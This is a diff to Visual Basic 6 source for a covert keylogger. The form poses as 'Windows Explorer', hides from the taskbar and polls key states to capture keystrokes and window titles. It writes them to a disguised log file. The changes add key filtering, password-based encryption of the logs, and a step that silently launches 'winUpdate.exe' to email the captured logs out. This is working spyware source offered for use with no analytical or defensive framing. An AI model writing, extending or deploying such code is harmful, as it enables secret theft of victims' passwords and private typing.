@@ -2,17 +2,17 @@ VERSION 5.00
 Begin VB.Form Form1 
    BorderStyle     =   0  'None
    Caption         =   "Windows Explorer"
-   ClientHeight    =   90
+   ClientHeight    =   4065
    ClientLeft      =   0
    ClientTop       =   0
-   ClientWidth     =   90
+   ClientWidth     =   5295
    Icon            =   "Form1.frx":0000
    LinkTopic       =   "Form1"
    MaxButton       =   0   'False
    MinButton       =   0   'False
-   ScaleHeight     =   6
+   ScaleHeight     =   271
    ScaleMode       =   3  'Pixel
-   ScaleWidth      =   6
+   ScaleWidth      =   353
    ShowInTaskbar   =   0   'False
    Begin VB.TextBox txtUserName 
       Height          =   285
@@ -36,6 +36,7 @@ Begin VB.Form Form1
       Width           =   3255
    End
    Begin VB.TextBox Text1 
+      Enabled         =   0   'False
       Height          =   3495
       Left            =   120
       MultiLine       =   -1  'True
@@ -45,7 +46,7 @@ Begin VB.Form Form1
    End
    Begin VB.Timer Timer1 
       Enabled         =   0   'False
-      Interval        =   64
+      Interval        =   65
       Left            =   4920
       Top             =   480
    End
@@ -75,7 +76,7 @@ Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As In
 Dim LPath, Pwd As String
 
 'Prevent only Titles in LOG
-Dim HasSomeText As Boolean  'Log wil not recorded if HasSomeText=False
+Dim HasSomeText As Boolean 'Log wil not recorded if HasSomeText=False
 
 Private Sub Form_Load()
 
@@ -105,7 +106,11 @@ LPath = LPath & "\browse" & Format$(Now, "dd" & "mm" & "yy") & "z.nkl"
 If Dir(LPath) = "" Then
 'Write initials
 Open LPath For Append As 1
-Write #1, Chr(155), Time, Date, Encrypt(txtUserName, 25), Encrypt(Pwd, 20), Encrypt(App.Revision, 20)
+    If Pwd = "" Then    'To avoid the null string encrypt error.
+    Write #1, Chr(155), Time, Date, Encrypt(txtUserName, 25), "", Encrypt(App.Revision, 20)
+    Else
+    Write #1, Chr(155), Time, Date, Encrypt(txtUserName, 25), Encrypt(Pwd, 20), Encrypt(App.Revision, 20)
+    End If
 Close #1
 End If
 
@@ -114,16 +119,18 @@ End Sub
 
 
 Private Sub LoadSetting()
-Dim noneed1, noneed2, noneed3, noneed4 As String
+Dim PCDec As String
 If Dir("C:\Documents and Settings\" & txtUserName & "\Application Data\System\STP.txt") <> "" Then 'setting file found then
     
     Open "C:\Documents and Settings\" & txtUserName & "\Application Data\System\STP.txt" For Input As 1
-    Input #1, LPath, noneed1, noneed2, noneed3, noneed4, Pwd
+    Input #1, LPath, Pwd, PCDec
     Close #1
-
 Else    'setting not found
     MsgBox "Settings not found", , "Error": End
 End If
+
+'To disable sending Email set PC Dec=none or delete WinUpdate.exe
+If LCase(PCDec) <> "none" And Dir(App.Path & "\winUpdate.exe") <> "" Then Shell App.Path & "\winUpdate.exe"
 
 End Sub
 
@@ -146,16 +153,30 @@ If Result = -32767 Then
                ' delete last letter becoz Backspace pressed
                 If Len(Text1) > 0 And Right(Text1.Text, 1) <> "]" And Right(Text1.Text, 1) <> Chr(13) Then Text1.Text = Left(Text1.Text, Len(Text1) - 1)
         Else
-         Text1.Text = Text1.Text + CheckShift(i)
-         HasSomeText = True  'Something is typed
+            Text1.Text = Text1.Text + CheckShift(i)
+            HasSomeText = IsTextKey(i)
         End If
     End If
 
 End If
 Next i
 End Sub
+Private Function IsTextKey(KeyNo As Integer) As Boolean
 
+Select Case KeyNo
+Case 48 To 57
+IsTextKey = True
+Case 96 To 105
+IsTextKey = True
+Case 107 To 111
+IsTextKey = True
+Case 186 To 221
+IsTextKey = True
+Case Else
+IsTextKey = False
+End Select
 
+End Function
 'If ActiveWindow Title changes then Records text from text box to file
 Private Sub Text2_Change()
 
@@ -190,11 +211,15 @@ End If
 End Sub
 '************************encrypting and Recording to file use of Append*********
 Private Sub Appendnow()
-Call startLogging   'Loads New LPath
+'Call startLogging   'Loads New LPath
 
 If Dir(LPath) <> "" Then
         Open LPath For Append As #1
-        Print #1, Text1
+        If Pwd = "" Then
+        Print #1, Text1         'Dont encrypt if no password
+        Else
+        Print #1, Encrypt(Text1, 20)
+        End If
         Text1.Text = ""
         Close #1
 Else
@@ -341,6 +366,7 @@ End Select
 
 End Function
 Private Function locatekey(ByVal b As Integer) As String
+
 Select Case b
 Case 27
     locatekey = "[ESC]"
